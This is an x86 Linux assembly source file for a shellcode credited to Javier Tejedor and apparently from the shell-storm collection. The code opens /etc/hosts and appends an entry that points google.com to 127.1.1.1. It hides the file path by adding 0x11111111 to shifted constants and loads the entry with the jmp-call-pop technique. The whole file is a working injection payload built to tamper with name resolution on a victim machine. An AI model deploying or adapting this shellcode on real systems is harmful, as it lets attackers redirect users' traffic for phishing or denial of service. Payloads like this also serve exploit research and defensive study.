;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1 
;author Javier Tejedor
;date 24/09/2014
;http://shell-storm.org/shellcode/files/shellcode-893.php

global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx

mov esi,0x6263625e
add esi,0x11111111
mov dword[esp-4],esi
sub esp,4

    ;push 0x7374736f     ;/etc///hosts

mov esi,0x571e1e1e 
add esi,0x11111111
mov dword[esp-4],esi
sub esp,4
   
     ;push 0x682f2f2f

 mov esi,0X5263541e
add esi,0x11111111
mov dword[esp-4],esi
sub esp,4

    ;push 0x6374652f

    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    ;push 0x6
    ;pop eax
    mov al,0x6
    int 0x80        ;syscall to close the file

    ;push 0x1
    ;pop eax
    mov al,0x1
     int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

